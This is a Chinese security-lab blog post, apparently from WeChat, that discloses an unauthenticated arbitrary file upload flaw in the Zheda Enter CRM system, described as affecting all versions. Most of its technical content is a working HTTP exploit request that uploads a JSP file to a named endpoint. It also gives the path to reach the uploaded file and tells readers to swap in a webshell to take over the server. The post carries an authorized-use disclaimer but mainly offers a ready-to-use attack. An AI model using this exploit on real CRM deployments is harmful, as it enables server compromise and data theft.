#  某大型CRM前台任意文件上传（最新zero day）

原创 凯撒安全实验室  [ 凯撒安全实验室 ](javascript:void\(0\);)

**凯撒安全实验室** ![]()

微信号 SecueKaiser

功能介绍 Secure
Kaiser安全团队成立于2021年7月，是一个对网安事业充满热忱和奉献精神的团队，团队致力于红蓝对抗、CTF、漏洞挖掘、渗透测试，在众多国家级、省市级CTF比赛中名列前茅。

____

___发表于_

收录于合集

**0x01  阅读须知**

**凯撒安全实验室的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。
本文所提供的工具仅用于学习，禁止用于其他！！！**

 **0x02 漏洞原理**

浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。通过浙大恩特CRM系统，企业可以更好地管理客户关系，提升销售绩效，提高客户满意度，实现业务增长和持续发展。
**本文将复现该漏洞的利用方法。**

 ****

![]()

 **0x03 漏洞利用**

影响版本：

浙大恩特CRM全版本

 **漏洞利用点为：**

/entsoft/CustomerAction.entphone;.js?method=loadFile
**接口，当访问接口时出现如下响应体时，可认定该漏洞存在。**

![]()

 **exp：**

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1Host: xxxxxxxxUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2AContent-Length: 208  
    ------WebKitFormBoundarye8FPHsIAq9JN8j2AContent-Disposition: form-data; name="file";filename="xx.jsp"Content-Type: image/jpeg  
    <%out.print("hello world");%>------WebKitFormBoundarye8FPHsIAq9JN8j2A--  
    

 **打入exp  **

![]()

 **访问** **/url/enterdoc/gesnum/xxxxxx/photo/xxxx.jsp**

![]()

  同理 将poyload换成webshell马 可获取服务器权限：

![]()

关注公众号带你了解更多0/1day漏洞

零日/一日 漏洞探讨加 Seven_-0928  

本实验室接受正规站点的授权渗透测试服务。

如你的公司业务有Web渗透测试，ctf比赛，高级渗透测试，红蓝对抗，黑客溯源，Java代码审计等需求可联系以下微信进行商务洽谈：Xud330327

![]()

  

预览时标签不可点

微信扫一扫  
关注该公众号

轻触阅读原文

继续滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

